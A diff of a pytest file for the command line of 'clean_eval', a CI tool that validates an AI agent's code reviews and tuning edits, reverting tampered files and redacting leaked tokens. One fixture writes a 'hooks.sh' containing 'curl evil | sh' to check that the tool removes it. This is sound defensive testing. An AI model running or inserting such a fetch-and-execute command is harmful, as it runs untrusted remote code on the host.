@@ -1,48 +1,26 @@
-"""The command line (external/cli.py): its composition root, the CI commands over real files and a fake `gh`, and
-`python -I clean_eval <command>` end to end on throwaway repositories."""
+"""The command line (external/cli.py): its composition root; the CI commands run in-process over real files, with the
+code host mocked (`host` is what cli.github() hands out); and `python -I clean_eval <command>` end to end, in a
+subprocess (`run_cli`), on throwaway repositories (`repo`, holding `history`)."""
 
-import argparse
-import contextlib
-import copy
 import datetime as dt
-import io
 import json
-import os
-import shutil
-import subprocess
-import sys
+from pathlib import Path
 
 import pytest
 
-from clean_eval.domain.errors import InvalidRequest
-from clean_eval.domain.review import AgentReview, RiskReport
+from clean_eval.domain.errors import InvalidRequest, RemoteError
+from clean_eval.domain.review import HostReview
 from clean_eval.external import cli
 from clean_eval.external.filesystem import FileSystemGateway
-from clean_eval.use_cases.evaluation import SNAPSHOT, snapshot_tuning
 from clean_eval.use_cases.review import lines_on_diff
-from clean_eval.use_cases.rules.review import finalize_review, parse_rules, redact
-from tests.domain.builders import facts
-from tests.helpers import ROOT, Repo, days_ago, read, read_json, write, write_json
+from clean_eval.use_cases.rules.review import redact
+from tests.helpers import Dates
 
-# The composition root (external/cli.py): what it builds from the request and this process's environment.
+pytestmark = pytest.mark.e2e  # the command line's tests: most run `python -I clean_eval ...` in a subprocess
 
-
-def test_period_bounds():
-    p = cli.period("2026-01-01", "2026-01-31", 10)
-    assert (p.lookahead_until, p.window_days) == (dt.date(2026, 2, 10), 10)
-    assert p.until_ts == dt.datetime(2026, 1, 31, 23, 59, 59, tzinfo=dt.timezone.utc).timestamp()
-    with pytest.raises(InvalidRequest):
-        cli.period("2026-01-01", "soon")
-
-
-def test_the_secrets_come_from_this_process_environment(monkeypatch):
-    monkeypatch.setenv("SOME_SECRET", "hunter2-hunter2")
-    assert redact("pw hunter2-hunter2", cli.secrets())[0] == "pw [REDACTED]"
-
-
-# The CI commands (external/cli.py) end to end over real files and a fake `gh`: finalizing the agent's review or eval
-# (tuning edits kept only when they validate), and posting the review.
-
+# The commands `clean_eval --help` lists, in its order.
+COMMANDS = ["assess", "finalize", "guard", "history", "post", "prepare", "rate", "readme", "redact", "report"]
+# A review-rules.md: a blocker rule from the Low band, and a major and a minor one from Moderate.
 RULES = """
 | ID | Severity | Min tier | Rule |
 |---|---|---|---|
@@ -50,514 +28,605 @@ RULES = """
 | Q-02 | major | Moderate | failure paths |
 | Q-04 | minor | Moderate | clarity |
 """
-
-
-def quietly(fn, *args):
-    with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
-        return fn(*args)
-
-
-def hist_fixture(hot=6, cold=16):
-    """An eval-history.json with `hot` defective PRs on widely-depended-on modules hot0.. and `cold` clean PRs on leaf
-    modules cold0..: under the default policy every hot PR outscores every cold one (AUC 1.0)."""
-
-    def pr(n, name, fan_in, defective):
-        f = facts(name=name, fan_in=fan_in).model_dump(mode="json")
-        defect = {
-            "fix_sha": "%040x" % (1000 + n),
-            "subject": "fix",
-            "kind": "fix",
-            "confidence": "heuristic",
-            "days_after": 1.0,
-            "overlap_files": [name + ".py"],
+# The agent's edits of .clean-eval/risk-model.json: one that validates and keeps the AUC; one of the structure, which
+# CI may not change; one that drops the only term telling the hot modules from the cold ones, so every PR scores the
+# same (AUC 0.5 < 1.0); and a model that was there before the agent ran.
+VALID_MODEL = {"business_weights": {"dependents": 0.4}}
+STRUCTURAL_MODEL = {"depth": 1}
+FLAT_MODEL = {"business_weights": {"dependents": 0}, "effects_mix": {"dependents": 0}}
+EARLIER_MODEL = {"depth": 2, "business_weights": {"dependents": 0.35}}
+RECOMMENDATION = {"target": "risk-model.json", "change": "c", "evidence": "e"}
+# What the review agent proposed: CA-01 at a lower severity than its rule's, and a report with a clean-eval marker of its
+# own and a token.
+UNDERRATED_BLOCKER = {"rule": "CA-01", "severity": "minor", "file": "a.py", "line": 3, "summary": "s"}
+AGENT_REPORT = "## Review\n<!-- clean-eval:pr-review tier=Low -->\nghp_" + "x" * 36
+# Findings of a review: a blocker on line 3 of a.py, and a major one on no line, so never attached inline.
+BLOCKER = {"rule": "CA-01", "severity": "blocker", "file": "a.py", "line": 3, "summary": "s"}
+UNPLACED = {"rule": "Q-02", "severity": "major", "file": None, "line": None, "summary": "s"}
+# The context's diff (as `prepare pr-review` writes it): a.py changes line 2, so lines 1-3 take inline comments.
+PATCH = "diff --git a/a.py b/a.py\n--- a/a.py\n+++ b/a.py\n@@ -1,3 +1,3 @@\n x\n-y\n+Y\n z\n"
+DIFF = {
+    "diff/index.json": [
+        {
+            "file": "a.py",
+            "module": None,
+            "patch": "diff/001.patch",
+            "patch_lines": 8,
+            "added": 1,
+            "removed": 1,
+            "truncated": False,
         }
-        return {
-            "sha": "%040x" % n,
-            "base": "%040x" % (500 + n),
-            "author": "dev",
-            "ts": n,
-            "subject": "pr",
-            "pr": n,
-            "max_tier": "Moderate",
-            "max_score": 0,
-            "defects": [defect] if defective else [],
-            "modules": [{"module": name, "band": "Moderate", "score": 0, "rated": True, "facts": f}],
-        }
-
-    prs = [pr(i, "hot%d" % i, 6, True) for i in range(hot)] + [pr(hot + i, "cold%d" % i, 0, False) for i in range(cold)]
-    return {
-        "period": {
-            "since": "2026-01-01",
-            "until": "2026-02-01",
-            "branch": "main",
-            "defect_window_days": 30,
-            "policy_version": 2,
-        },
-        "totals": {"prs": len(prs), "defective_prs": hot},
-        "calibration": {"auc_max_score": 1.0 if hot and cold else None},
-        "prs": prs,
-    }
-
-
-HEAD = "c" * 40
-RISK = {
-    "pr": 1,
-    "base": "b" * 40,
-    "head": HEAD,
-    "max_tier": "High",
-    "max_score": 52,
-    "model_source": "clean-eval default",
-    "model_version": 2,
-    "rules_source": "clean-eval default",
-    "rules_version": "abcd1234",
-    "files_changed": 1,
-    "modules": [],
-    "files": {"a.py": None},
-    "ignored": [],
-    "notes": [],
+    ],
+    "diff/001.patch": PATCH,
 }
+# The reviews on the PR once review 50 is posted: this reviewer's earlier change request (10) is stale, but not a
+# human's (11), a comment (12) or the new review itself.
+BOT = "github-actions[bot]"
+MARKER = "<!-- clean-eval:pr-review tier=High -->"
+REVIEWS = [
+    HostReview(id=10, state="CHANGES_REQUESTED", user=BOT, body=MARKER),
+    HostReview(id=11, state="CHANGES_REQUESTED", user="human", body=MARKER),
+    HostReview(id=12, state="COMMENTED", user=BOT, body=MARKER),
+    HostReview(id=50, state="CHANGES_REQUESTED", user=BOT, body=MARKER),
+]
+# Repositories: a billing module (one with tests) and a users module depending on it; then a change of the users module
+# that also adds docs and infrastructure.
+BILLING = [
+    {
+        "subject": "init",
+        "files": {
+            "src/billing/core.py": "import requests\n\ndef charge(x):\n    return requests.post('u', json=x)\n"
+            + "\n".join("def f%d(a):\n    return a\n" % number for number in range(60)),
+            "src/billing/models.py": "class Invoice:\n    pass\n" * 40,
+            "src/users/api.py": "from src.billing.core import charge\n\ndef sign_up(u):\n    return charge(u)\n" * 30,
+            "tests/test_core.py": "from src.billing.core import charge\n\ndef test_charge():\n    assert charge\n",
+        },
+        "when": Dates.days_ago(4),
+    },
+    {
+        "subject": "feat: users",
+        "files": {
+            "src/users/api.py": "def sign_up(u):\n    return u\n",
+            "docs/x.md": "doc\n",
+            "infra/main.tf": "resource {}\n",
+        },
+        "when": Dates.days_ago(2),
+    },
+]
+APP_WITH_README = [
+    {
+        "subject": "init",
+        "files": {"app/a.py": "def a():\n    return 1\n", "README.md": "# App\n"},
+        "when": Dates.days_ago(2),
+    }
+]
+V1_POLICY = [
+    {
+        "subject": "init",
+        "files": {"a/b.py": "x = 1\n", ".clean-eval/risk-model.json": '{"window_days": 30}'},
+        "when": Dates.days_ago(1),
+    }
+]
+# A feature PR, then a fix of it the next day.
+UTC = dt.timezone.utc
+FIXED_FEATURE = [
+    {"subject": "init", "files": {"src/a/x.py": "1\n"}, "when": dt.datetime(2026, 1, 1, 12, tzinfo=UTC)},
+    {"subject": "feat: a (#1)", "files": {"src/a/x.py": "2\n"}, "when": dt.datetime(2026, 2, 1, 12, tzinfo=UTC)},
+    {"subject": "fix: a (#2)", "files": {"src/a/x.py": "3\n"}, "when": dt.datetime(2026, 2, 2, 12, tzinfo=UTC)},
+]
 
 
-def finding(**kw):
-    return {"rule": "Q-02", "severity": "major", "file": "a.py", "line": 3, "summary": "s", **kw}
+class TestPeriod:
+    """The Period the composition root builds from --since and --until: through the end of the last day, with a window
+    of look-ahead; the dates must be YYYY-MM-DD."""
+
+    def test_a_period_runs_through_its_last_day_and_looks_ahead(
+        self,
+    ):
+        period = cli.period("2026-01-01", "2026-01-31", 10)
+        assert (period.lookahead_until, period.window_days) == (dt.date(2026, 2, 10), 10)
+        assert period.until_ts == dt.datetime(2026, 1, 31, 23, 59, 59, tzinfo=UTC).timestamp()
+
+    def test_a_date_that_is_not_yyyy_mm_dd_is_an_invalid_request(
+        self,
+    ):
+        with pytest.raises(InvalidRequest):
+            cli.period("2026-01-01", "soon")
 
 
-def review(*findings, raw=None, risk=None, rules=RULES):
-    """The Review CI trusts from what the agent proposed (`findings`, or a whole result.json as `raw`)."""
-    return finalize_review(
-        AgentReview.model_validate({"findings": list(findings)} if raw is None else raw),
-        RiskReport.model_validate(risk or RISK),
-        parse_rules(rules),
-    )
+class TestSecrets:
+    """The values to redact are the secret-looking variables of this process's environment."""
+
+    @pytest.mark.parametrize("environ", [{"SOME_SECRET": "hunter2-hunter2"}], indirect=True)
+    def test_the_secrets_come_from_this_process_environment(
+        self,
+        process_env,
+    ):
+        assert redact("pw hunter2-hunter2", cli.secrets())[0] == "pw [REDACTED]"
 
 
-class TestFinalizeEval:
-    """The tuning files are snapshotted before the agent runs (as `prepare eval` does); finalize keeps an edit only when
-    it passes validation and restores everything else."""
+class TestFinalizeEvalJudgesTheModelEdit:
+    """`finalize --skill eval` keeps the agent's edit of .clean-eval/risk-model.json only with --apply, and only when it
+    validates and holds the AUC on a sample large enough to tell; otherwise the file is put back as it was before the
+    agent ran (removed when it wasn't there)."""
 
-    @pytest.fixture(autouse=True)
-    def workspace(self, tmp_path):
-        """A workspace with .clean-eval/, a context folder with the history, and the snapshot `prepare eval` takes."""
-        self.dir = str(tmp_path)
-        self.ctx, self.agent, self.out, self.ws = (os.path.join(self.dir, d) for d in ("ctx", "agent", "out", "ws"))
-        self.live = os.path.join(self.ws, ".clean-eval")
-        for d in (self.ctx, self.agent, self.out, self.live):
-            os.makedirs(d)
-        self.orig = {}  # no overrides yet
-        self.use_history(hist_fixture())
-        self.model_path = os.path.join(self.live, "risk-model.json")
-        self.rules_path = os.path.join(self.live, "review-rules.md")
-        self.gh_out = os.path.join(self.dir, "gh_out")
-        self.snapshot()
+    @pytest.mark.parametrize("tuning_edits", [{"risk-model.json": VALID_MODEL}], indirect=True)
+    @pytest.mark.parametrize("agent_files", [{"result.json": {"recommendations": [RECOMMENDATION]}}], indirect=True)
+    def test_a_valid_edit_is_kept(
+        self,
+        finalize_eval_args,
+        cli_runner,
+        ci_folders,
+    ):
+        assert cli_runner.invoke(cli.clean_eval, finalize_eval_args).exit_code == 0
+        result = json.loads(Path(ci_folders.out, "result.json").read_text())
+        assert result["model_change"]["accepted"]
+        assert result["applied"]
+        assert Path(ci_folders.ws, ".clean-eval", "risk-model.json").exists()
+        assert "applied=true" in Path(ci_folders.gh_output).read_text()
+        assert result["recommendations"] == [RECOMMENDATION]
 
-    def snapshot(self):
-        snap = os.path.join(self.ctx, SNAPSHOT)
-        shutil.rmtree(snap, ignore_errors=True)
-        snapshot_tuning(FileSystemGateway(), self.ws, snap)
+    @pytest.mark.parametrize("tuning_edits", [{"risk-model.json": STRUCTURAL_MODEL}], indirect=True)
+    def test_a_structural_edit_is_reverted(
+        self,
+        finalize_eval_args,
+        cli_runner,
+        ci_folders,
+    ):
+        assert cli_runner.invoke(cli.clean_eval, finalize_eval_args).exit_code == 0
+        assert not json.loads(Path(ci_folders.out, "result.json").read_text())["model_change"]["accepted"]
+        assert not Path(ci_folders.ws, ".clean-eval", "risk-model.json").exists()  # it wasn't there
 
-    def use_history(self, hist):
-        write_json(os.path.join(self.ctx, "eval-history.json"), hist)
+    @pytest.mark.parametrize("tuning_edits", [{"risk-model.json": FLAT_MODEL}], indirect=True)
+    def test_an_edit_that_lowers_the_auc_is_reverted(
+        self,
+        finalize_eval_args,
+        cli_runner,
+        ci_folders,
+    ):
+        assert cli_runner.invoke(cli.clean_eval, finalize_eval_args).exit_code == 0
+        model_change = json.loads(Path(ci_folders.out, "result.json").read_text())["model_change"]
+        assert not model_change["accepted"]
+        assert "below" in model_change["reason"]
 
-    def run_finalize(self, agent_result, apply=True):
-        if agent_result is not None:
-            write_json(os.path.join(self.agent, "result.json"), agent_result)
-        a = argparse.Namespace(
-            skill="eval",
-            ctx=self.ctx,
-            agent=self.agent,
-            out=self.out,
-            workspace=self.ws,
-            apply=apply,
-            gh_output=self.gh_out,
-        )
-        return quietly(cli.finalize, a) or 0
+    @pytest.mark.parametrize("eval_history", [(3, 10)], indirect=True)
+    @pytest.mark.parametrize("tuning_edits", [{"risk-model.json": VALID_MODEL}], indirect=True)
+    def test_an_edit_on_a_small_sample_is_rejected(
+        self,
+        finalize_eval_args,
+        cli_runner,
+        ci_folders,
+    ):
+        assert cli_runner.invoke(cli.clean_eval, finalize_eval_args).exit_code == 0
+        model_change = json.loads(Path(ci_folders.out, "result.json").read_text())["model_change"]
+        assert "sample too small" in model_change["reason"]
+        assert not Path(ci_folders.ws, ".clean-eval", "risk-model.json").exists()
 
-    def write_model(self, mutate):
-        m = copy.deepcopy(self.orig)
-        mutate(m)
-        write_json(self.model_path, m, indent=2)
+    @pytest.mark.parametrize("eval_history", [(0, 30)], indirect=True)
+    @pytest.mark.parametrize("tuning_edits", [{"risk-model.json": {"unrated_band": "Low"}}], indirect=True)
+    def test_an_edit_with_an_undefined_auc_is_rejected(
+        self,
+        finalize_eval_args,
+        cli_runner,
+        ci_folders,
+    ):
+        assert cli_runner.invoke(cli.clean_eval, finalize_eval_args).exit_code == 0
+        assert not json.loads(Path(ci_folders.out, "result.json").read_text())["model_change"]["accepted"]
+        assert not Path(ci_folders.ws, ".clean-eval", "risk-model.json").exists()
 
-    def result(self):
-        return read_json(os.path.join(self.out, "result.json"))
+    @pytest.mark.parametrize("tuning_edits", [{"risk-model.json": VALID_MODEL}], indirect=True)
+    @pytest.mark.parametrize("finalize_eval_args", [[]], indirect=True)
+    def test_without_apply_an_edit_is_rejected(
+        self,
+        finalize_eval_args,
+        cli_runner,
+        ci_folders,
+    ):
+        assert cli_runner.invoke(cli.clean_eval, finalize_eval_args).exit_code == 0
+        assert not Path(ci_folders.ws, ".clean-eval", "risk-model.json").exists()
+        model_change = json.loads(Path(ci_folders.out, "result.json").read_text())["model_change"]
+        assert model_change == {"accepted": False, "reason": "apply=false"}
 
-    def test_valid_tuning_accepted(self):
-        self.write_model(lambda m: m.update(business_weights={"dependents": 0.4}))
+    @pytest.mark.parametrize("tuning", [{"risk-model.json": EARLIER_MODEL}], indirect=True)
+    @pytest.mark.parametrize("tuning_edits", [{"risk-model.json": None}], indirect=True)
+    def test_removing_the_model_is_judged_like_an_edit(
+        self,
+        finalize_eval_args,
+        cli_runner,
+        ci_folders,
+    ):
         assert (
-            self.run_finalize({"recommendations": [{"target": "risk-model.json", "change": "c", "evidence": "e"}]}) == 0
-        )
-        res = self.result()
-        assert res["model_change"]["accepted"]
-        assert res["applied"]
-        assert os.path.exists(self.model_path)
-        assert "applied=true" in read(self.gh_out)
-        assert res["recommendations"] == [{"target": "risk-model.json", "change": "c", "evidence": "e"}]
+            cli_runner.invoke(cli.clean_eval, finalize_eval_args).exit_code == 0
+        )  # back to the defaults would also change `depth`: not allowed
+        assert not json.loads(Path(ci_folders.out, "result.json").read_text())["model_change"]["accepted"]
+        model = Path(ci_folders.ws, ".clean-eval", "risk-model.json")
+        assert json.loads(model.read_text()) == EARLIER_MODEL
 
-    def test_structural_edit_reverted(self):
-        self.write_model(lambda m: m.update(depth=1))
-        assert self.run_finalize({"recommendations": []}) == 0
-        assert not self.result()["model_change"]["accepted"]
-        assert not os.path.exists(self.model_path)  # didn't exist before → removed
 
-    def test_edit_that_lowers_auc_reverted(self):
-        # drop the only term that tells hot from cold modules: every PR scores the same → AUC 0.5 < 1.0
-        self.write_model(lambda m: m.update(business_weights={"dependents": 0}, effects_mix={"dependents": 0}))
-        self.run_finalize({"recommendations": []})
-        res = self.result()
-        assert not res["model_change"]["accepted"]
-        assert "below" in res["model_change"]["reason"]
+class TestFinalizeEvalJudgesTheRulesEdit:
+    """`finalize --skill eval` keeps the agent's edit of .clean-eval/review-rules.md when its table is valid; removing
+    the file, or a table that isn't, is reverted."""
 
-    def test_small_sample_rejected(self):
-        self.use_history(hist_fixture(hot=3, cold=10))
-        self.write_model(lambda m: m.update(business_weights={"dependents": 0.4}))
-        self.run_finalize({"recommendations": []})
-        assert "sample too small" in self.result()["model_change"]["reason"]
-        assert not os.path.exists(self.model_path)
+    @pytest.mark.parametrize("tuning", [{"review-rules.md": RULES}], indirect=True)
+    @pytest.mark.parametrize(
+        "tuning_edits", [{"review-rules.md": RULES + "| Q-05 | major | High | new rule |\n"}], indirect=True
+    )
+    def test_a_valid_edit_is_kept(
+        self,
+        finalize_eval_args,
+        cli_runner,
+        ci_folders,
+    ):
+        assert cli_runner.invoke(cli.clean_eval, finalize_eval_args).exit_code == 0
+        assert json.loads(Path(ci_folders.out, "result.json").read_text())["rules_change"] == {"accepted": True}
+        assert "Q-05" in Path(ci_folders.ws, ".clean-eval", "review-rules.md").read_text()
 
-    def test_undefined_auc_rejected(self):
-        self.use_history(hist_fixture(hot=0, cold=30))
-        self.write_model(lambda m: m.update(unrated_band="Low"))
-        self.run_finalize({"recommendations": []})
-        assert not self.result()["model_change"]["accepted"]
-        assert not os.path.exists(self.model_path)
+    @pytest.mark.parametrize("tuning", [{"review-rules.md": RULES}], indirect=True)
+    @pytest.mark.parametrize("tuning_edits", [{"review-rules.md": None}], indirect=True)
+    def test_removing_the_rules_is_reverted(
+        self,
+        finalize_eval_args,
+        cli_runner,
+        ci_folders,
+    ):
+        assert cli_runner.invoke(cli.clean_eval, finalize_eval_args).exit_code == 0
+        assert json.loads(Path(ci_folders.out, "result.json").read_text())["rules_change"] == {
+            "accepted": False,
+            "reason": "review-rules.md may not be removed",
+        }
+        assert Path(ci_folders.ws, ".clean-eval", "review-rules.md").read_text() == RULES
 
-    def test_edits_rejected_when_apply_false(self):
-        self.write_model(lambda m: m.update(business_weights={"dependents": 0.4}))
-        self.run_finalize({"recommendations": []}, apply=False)
-        assert not os.path.exists(self.model_path)
-        assert self.result()["model_change"] == {"accepted": False, "reason": "apply=false"}
+    @pytest.mark.parametrize(
+        "tuning_edits", [{"review-rules.md": RULES + "| CA-01 | major | Low | duplicate |\n"}], indirect=True
+    )
+    def test_a_bad_edit_is_reverted(
+        self,
+        finalize_eval_args,
+        cli_runner,
+        ci_folders,
+    ):
+        assert cli_runner.invoke(cli.clean_eval, finalize_eval_args).exit_code == 0
+        assert not Path(ci_folders.ws, ".clean-eval", "review-rules.md").exists()  # it wasn't there
 
-    def test_invalid_agent_output_reverts_accepted_edits(self):
-        self.write_model(lambda m: m.update(business_weights={"dependents": 0.4}))
-        write(os.path.join(self.agent, "result.json"), "not json")
-        assert self.run_finalize(None) == 2
-        assert not os.path.exists(self.model_path)
-        assert not os.path.exists(os.path.join(self.out, "result.json"))
 
-    def test_unreadable_history_reverts_edits(self):
-        write(os.path.join(self.ctx, "eval-history.json"), "{broken")
-        self.write_model(lambda m: m.update(business_weights={"dependents": 0.4}))
-        assert self.run_finalize({"recommendations": []}) == 2
-        assert not os.path.exists(self.model_path)
+class TestFinalizeEvalRestoresTheOtherFiles:
+    """`finalize --skill eval` puts every other file of .clean-eval/ back as it was: changed, created and deleted
+    ones."""
 
-    def test_removing_the_model_is_judged_like_an_edit(self):
-        write_json(self.model_path, {"depth": 2, "business_weights": {"dependents": 0.35}})
-        self.snapshot()
-        os.remove(self.model_path)  # back to the defaults would also change `depth`, which CI may not
-        self.run_finalize({"recommendations": []})
-        assert not self.result()["model_change"]["accepted"]
-        assert read_json(self.model_path) == {"depth": 2, "business_weights": {"dependents": 0.35}}
+    @pytest.mark.parametrize("tuning", [{"notes.md": "original", "sub/keep.txt": "k"}], indirect=True)
+    @pytest.mark.parametrize(
+        "tuning_edits",
+        [{"notes.md": "tampered", "hooks.sh": "curl evil | sh", "sub/keep.txt": None}],
+        indirect=True,
+    )
+    def test_other_clean_eval_files_restored(
+        self,
+        finalize_eval_args,
+        cli_runner,
+        ci_folders,
+    ):
+        assert cli_runner.invoke(cli.clean_eval, finalize_eval_args).exit_code == 0
+        tuning_dir = Path(ci_folders.ws, ".clean-eval")
+        assert (tuning_dir / "notes.md").read_text() == "original"
+        assert not (tuning_dir / "hooks.sh").exists()
+        assert (tuning_dir / "sub" / "keep.txt").read_text() == "k"
+        assert json.loads(Path(ci_folders.out, "result.json").read_text())["other_files_reverted"] == [
+            "hooks.sh",
+            "notes.md",
+            str(Path("sub", "keep.txt")),
+        ]
 
-    def test_removing_the_rules_is_reverted(self):
-        write(self.rules_path, RULES)
-        self.snapshot()
-        os.remove(self.rules_path)
-        self.run_finalize({"recommendations": []})
-        assert self.result()["rules_change"] == {"accepted": False, "reason": "review-rules.md may not be removed"}
-        assert read(self.rules_path) == RULES
 
-    def test_valid_rules_edit_accepted(self):
-        write(self.rules_path, RULES)
-        self.snapshot()
-        write(self.rules_path, RULES + "| Q-05 | major | High | new rule |\n")
-        self.run_finalize({"recommendations": []})
-        assert self.result()["rules_change"] == {"accepted": True}
-        assert "Q-05" in read(self.rules_path)
+@pytest.mark.parametrize("tuning_edits", [{"risk-model.json": VALID_MODEL}], indirect=True)
+class TestFinalizeEvalFailsClosed:
+    """When the agent's output or the history can't be trusted, `finalize --skill eval` exits 2 and reverts every edit,
+    even one that would pass."""
 
-    def test_other_clean_eval_files_restored(self):
-        write(os.path.join(self.live, "notes.md"), "original")
-        write(os.path.join(self.live, "sub", "keep.txt"), "k")
-        self.snapshot()
-        write(os.path.join(self.live, "notes.md"), "tampered")  # changed
-        write(os.path.join(self.live, "hooks.sh"), "curl evil | sh")  # created
-        os.remove(os.path.join(self.live, "sub", "keep.txt"))  # deleted
-        self.run_finalize({"recommendations": []})
-        assert read(os.path.join(self.live, "notes.md")) == "original"
-        assert not os.path.exists(os.path.join(self.live, "hooks.sh"))
-        assert read(os.path.join(self.live, "sub", "keep.txt")) == "k"
-        assert self.result()["other_files_reverted"] == ["hooks.sh", "notes.md", os.path.join("sub", "keep.txt")]
+    @pytest.mark.parametrize("agent_files", [{"result.json": "not json"}], indirect=True)
+    def test_invalid_agent_output_reverts_accepted_edits(
+        self,
+        finalize_eval_args,
+        cli_runner,
+        ci_folders,
+    ):
+        result = cli_runner.invoke(cli.clean_eval, finalize_eval_args)
+        assert result.exit_code == 2
+        assert not Path(ci_folders.ws, ".clean-eval", "risk-model.json").exists()
+        assert not Path(ci_folders.out, "result.json").exists()
+        assert "::error::clean-eval: invalid agent output" in result.stderr
 
-    def test_bad_rules_edit_reverted(self):
-        write(self.rules_path, RULES + "| CA-01 | major | Low | duplicate |\n")
-        self.run_finalize({"recommendations": []})
-        assert not os.path.exists(self.rules_path)
+    @pytest.mark.parametrize("context_files", [{"eval-history.json": "{broken"}], indirect=True)
+    def test_unreadable_history_reverts_edits(
+        self,
+        finalize_eval_args,
+        cli_runner,
+        ci_folders,
+    ):
+        assert cli_runner.invoke(cli.clean_eval, finalize_eval_args).exit_code == 2
+        assert not Path(ci_folders.ws, ".clean-eval", "risk-model.json").exists()
 
 
 class TestFinalizeReview:
-    @pytest.fixture(autouse=True)
-    def review_context(self, tmp_path):
-        """The context `prepare pr-review` writes: the risk report and the review rules."""
-        self.dir = str(tmp_path)
-        self.ctx, self.agent, self.out = (os.path.join(self.dir, d) for d in ("ctx", "agent", "out"))
-        write_json(os.path.join(self.ctx, "risk.json"), RISK)
-        write(os.path.join(self.ctx, "review-rules.md"), RULES)
-        os.makedirs(self.agent)
-        self.gh_out = os.path.join(self.dir, "gh_out")
+    """`finalize --skill pr-review` derives the verdict and the step outputs from the agent's findings and the rules,
+    and sanitizes the agent's report; an output that doesn't validate writes nothing."""
 
-    def finalize(self):
-        a = argparse.Namespace(
-            skill="pr-review",
-            ctx=self.ctx,
-            agent=self.agent,
-            out=self.out,
-            workspace=".",
-            apply=False,
-            gh_output=self.gh_out,
-        )
-        return quietly(cli.finalize, a) or 0
-
-    def test_outputs_are_derived_and_the_report_sanitized(self):
-        write_json(os.path.join(self.agent, "result.json"), {"findings": [finding(rule="CA-01", severity="minor")]})
-        write(
-            os.path.join(self.agent, "report.md"), "## Review\n<!-- clean-eval:pr-review tier=Low -->\nghp_" + "x" * 36
-        )
-        assert self.finalize() == 0
-        assert read(self.gh_out).splitlines() == [
-            "verdict=request_changes",
-            "max-tier=High",
-            "max-score=52",
+    @pytest.mark.parametrize(
+        "agent_files", [{"result.json": {"findings": [UNDERRATED_BLOCKER]}, "report.md": AGENT_REPORT}], indirect=True
+    )
+    def test_outputs_are_derived_and_the_report_sanitized(
+        self,
+        finalize_review_args,
+        risk_report,
+        cli_runner,
+        ci_folders,
+    ):
+        assert cli_runner.invoke(cli.clean_eval, finalize_review_args).exit_code == 0
+        assert Path(ci_folders.gh_output).read_text().splitlines() == [
+            "verdict=request_changes",  # CA-01 is a blocker, whatever severity the agent gave it
+            "max-tier=%s" % risk_report.max_tier,
+            "max-score=%d" % risk_report.max_score,
             "blockers=1",
         ]
-        report = read(os.path.join(self.out, "report.md"))
+        report = Path(ci_folders.out, "report.md").read_text()
         assert "clean-eval:" not in report
         assert "ghp_" not in report
-        assert read_json(os.path.join(self.out, "result.json"))["redactions"] == 1
+        assert json.loads(Path(ci_folders.out, "result.json").read_text())["redactions"] == 1
 
-    def test_invalid_output_writes_nothing(self):
-        write(os.path.join(self.agent, "result.json"), "[]")
-        assert self.finalize() == 2
-        assert not os.path.exists(os.path.join(self.out, "result.json"))
-        assert not os.path.exists(self.gh_out)
+    @pytest.mark.parametrize("agent_files", [{"result.json": "[]"}], indirect=True)
+    def test_invalid_output_writes_nothing(
+        self,
+        finalize_review_args,
+        cli_runner,
+        ci_folders,
+    ):
+        assert cli_runner.invoke(cli.clean_eval, finalize_review_args).exit_code == 2
+        assert not Path(ci_folders.out, "result.json").exists()
+        assert not Path(ci_folders.gh_output).exists()
 
 
+@pytest.mark.parametrize("agent_review", [{"findings": [BLOCKER, UNPLACED]}], indirect=True)
 class TestPost:
-    @pytest.fixture(autouse=True)
-    def validated_review(self, tmp_path, fake_bin):
-        """The validated result and report `finalize` wrote, and a fake `gh` to post them with."""
-        self.bin = fake_bin
-        self.out = str(tmp_path / "out")
-        os.makedirs(self.out)
-        res = review(finding(rule="CA-01", severity="blocker"), finding(file=None, line=None))
-        write_json(os.path.join(self.out, "result.json"), res.model_dump(mode="json"))
-        write(os.path.join(self.out, "report.md"), "## Review\n")
+    """`post` puts the validated review up as one review of the PR's head commit, falling back to fewer inline comments
+    when the host rejects them, then dismisses this reviewer's stale change requests; it fails only when no attempt
+    went up."""
 
-    def post(self, ctx=None):
-        return quietly(cli.post, argparse.Namespace(pr="1", out=self.out, head=HEAD, ctx=ctx))
-
-    def test_fallbacks_and_dismissal(self):
-        marker = "<!-- clean-eval:pr-review tier=High -->"
-        self.bin.gh(
+    @pytest.mark.parametrize(
+        "host",
+        [
             {
-                "post_review": [
-                    {"exit": 1, "err": "HTTP 422: line must be part of the diff"},
-                    {"exit": 0, "out": {"id": 50, "user": {"login": "github-actions[bot]"}}},
+                "post_review.side_effect": [
+                    RemoteError("gh api -X failed: HTTP 422: line must be part of the diff"),
+                    HostReview(id=50, user=BOT),
                 ],
-                "list_reviews": {
-                    "out": [
-                        {
-                            "id": 10,
-                            "state": "CHANGES_REQUESTED",
-                            "user": {"login": "github-actions[bot]"},
-                            "body": marker,
-                        },
-                        {"id": 11, "state": "CHANGES_REQUESTED", "user": {"login": "human"}, "body": marker},
-                        {"id": 12, "state": "COMMENTED", "user": {"login": "github-actions[bot]"}, "body": marker},
-                        {
-                            "id": 50,
-                            "state": "CHANGES_REQUESTED",
-                            "user": {"login": "github-actions[bot]"},
-                            "body": marker,
-                        },
-                    ]
-                },
-                "dismiss": {"exit": 0, "out": "{}"},
+                "reviews.return_value": REVIEWS,
             }
+        ],
+        indirect=True,
+    )
+    def test_fallbacks_and_dismissal(
+        self,
+        host,
+        post_args,
+        risk_report,
+        cli_runner,
+    ):
+        assert cli_runner.invoke(cli.clean_eval, post_args).exit_code == 0
+        assert [made.args[0] for made in host.post_review.call_args_list] == [1, 1]
+        posts = [made.args[1] for made in host.post_review.call_args_list]
+        assert [(post.event, post.commit_id) for post in posts] == [("REQUEST_CHANGES", risk_report.head)] * 2
+        assert posts[0].comments
+        assert posts[1].comments == []  # retried without inline comments
+        assert "clean-eval:pr-review tier=%s" % risk_report.max_tier in posts[1].body
+        assert "rules=CA-01,Q-02" in posts[1].body
+        assert "score=%d " % risk_report.max_score in posts[1].body  # scores are integers 0-100
+        host.dismiss_review.assert_called_once_with(
+            1, 10, "Superseded by the clean-eval review of %s" % risk_report.head[:8]
         )
-        assert self.post() == 0
-        calls = self.bin.gh_calls()
-        posts = [json.loads(c["stdin"]) for c in calls if "POST" in c["args"]]
-        assert [p["event"] for p in posts] == ["REQUEST_CHANGES", "REQUEST_CHANGES"]
-        assert "comments" in posts[0]
-        assert "comments" not in posts[1]  # retried without inline comments
-        assert "clean-eval:pr-review tier=High" in posts[1]["body"]
-        assert "rules=CA-01,Q-02" in posts[1]["body"]
